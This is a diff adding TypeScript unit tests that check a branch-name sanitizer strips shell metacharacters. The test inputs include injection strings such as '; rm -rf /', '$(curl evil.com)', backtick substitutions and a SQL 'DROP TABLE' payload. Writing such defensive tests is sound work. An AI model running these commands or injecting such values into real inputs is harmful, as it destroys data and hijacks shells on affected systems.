@@ -2,7 +2,7 @@ import { describe, expect, test } from "bun:test";
 import type { EidolonError, Result } from "@eidolon/protocol";
 import { Err, Ok } from "@eidolon/protocol";
 import type { Logger } from "../../logging/logger.ts";
-import { ImplementationPipeline, type ImplementFn, type RunCommandFn } from "../implementation.ts";
+import { ImplementationPipeline, type ImplementFn, type RunCommandFn, sanitizeBranchName } from "../implementation.ts";
 
 function createSilentLogger(): Logger {
   const noop = (): void => {};
@@ -202,5 +202,116 @@ describe("ImplementationPipeline", () => {
     expect(pr).toContain("[x] Tests passed");
     expect(pr).toContain("### Source");
     expect(pr).toContain("manual review and approval");
+  });
+});
+
+describe("sanitizeBranchName", () => {
+  test("passes through safe strings unchanged", () => {
+    expect(sanitizeBranchName("abc12345")).toBe("abc12345");
+    expect(sanitizeBranchName("my-branch.v2")).toBe("my-branch.v2");
+    expect(sanitizeBranchName("under_score")).toBe("under_score");
+  });
+
+  test("strips shell injection: semicolon + command", () => {
+    const result = sanitizeBranchName("; rm -rf /");
+    expect(result).not.toContain(";");
+    expect(result).not.toContain(" ");
+    expect(result).toBe("rm-rf");
+  });
+
+  test("strips shell injection: $() command substitution", () => {
+    const result = sanitizeBranchName("$(whoami)");
+    expect(result).not.toContain("$");
+    expect(result).not.toContain("(");
+    expect(result).not.toContain(")");
+    expect(result).toBe("whoami");
+  });
+
+  test("strips shell injection: backtick command substitution", () => {
+    const result = sanitizeBranchName("`id`");
+    expect(result).not.toContain("`");
+    expect(result).toBe("id");
+  });
+
+  test("strips shell injection: pipe and redirect", () => {
+    const result = sanitizeBranchName("foo|bar>baz");
+    expect(result).not.toContain("|");
+    expect(result).not.toContain(">");
+    expect(result).toBe("foo-bar-baz");
+  });
+
+  test("strips shell injection: newline injection", () => {
+    const result = sanitizeBranchName("safe\n; malicious");
+    expect(result).not.toContain("\n");
+    expect(result).toBe("safe-malicious");
+  });
+
+  test("strips shell injection: ampersand background execution", () => {
+    const result = sanitizeBranchName("foo && rm -rf /");
+    expect(result).not.toContain("&");
+    expect(result).toBe("foo-rm-rf");
+  });
+
+  test("strips shell injection: single and double quotes", () => {
+    const result = sanitizeBranchName('it\'s a "test"');
+    expect(result).not.toContain("'");
+    expect(result).not.toContain('"');
+    expect(result).toBe("it-s-a-test");
+  });
+
+  test("collapses multiple consecutive hyphens", () => {
+    expect(sanitizeBranchName("a---b")).toBe("a-b");
+    expect(sanitizeBranchName("!@#$%^")).toBe("");
+  });
+
+  test("trims leading and trailing hyphens", () => {
+    expect(sanitizeBranchName("-leading")).toBe("leading");
+    expect(sanitizeBranchName("trailing-")).toBe("trailing");
+    expect(sanitizeBranchName("---both---")).toBe("both");
+  });
+
+  test("limits length to 60 characters", () => {
+    const long = "a".repeat(100);
+    expect(sanitizeBranchName(long).length).toBeLessThanOrEqual(60);
+  });
+
+  test("returns empty string for entirely unsafe input", () => {
+    expect(sanitizeBranchName("!@#$%^&*()")).toBe("");
+    expect(sanitizeBranchName("   ")).toBe("");
+  });
+});
+
+describe("generateBranchName with malicious inputs", () => {
+  test("sanitizes discoveryId containing shell metacharacters", () => {
+    const branch = ImplementationPipeline.generateBranchName("; rm -rf /", "safe title");
+    expect(branch).not.toContain(";");
+    expect(branch).not.toContain(" ");
+    expect(branch).toMatch(/^learning\/[a-zA-Z0-9._-]+-[a-z0-9-]+$/);
+  });
+
+  test("sanitizes discoveryId with command substitution", () => {
+    const branch = ImplementationPipeline.generateBranchName("$(curl evil.com)", "test");
+    expect(branch).not.toContain("$");
+    expect(branch).not.toContain("(");
+    expect(branch).toMatch(/^learning\//);
+  });
+
+  test("sanitizes discoveryId with backtick injection", () => {
+    const branch = ImplementationPipeline.generateBranchName("`whoami`x", "test");
+    expect(branch).not.toContain("`");
+    expect(branch).toMatch(/^learning\//);
+  });
+
+  test("handles both malicious discoveryId and title", () => {
+    const branch = ImplementationPipeline.generateBranchName("$(evil)", "; DROP TABLE memories;--");
+    expect(branch).not.toContain("$");
+    expect(branch).not.toContain(";");
+    expect(branch).not.toContain(" ");
+    expect(branch).toMatch(/^learning\//);
+  });
+
+  test("handles completely unsafe inputs with fallback", () => {
+    const branch = ImplementationPipeline.generateBranchName("!@#$%^&*()", "!@#$%^&*()");
+    expect(branch).toMatch(/^learning\/discovery-\d+$/);
   });
 });
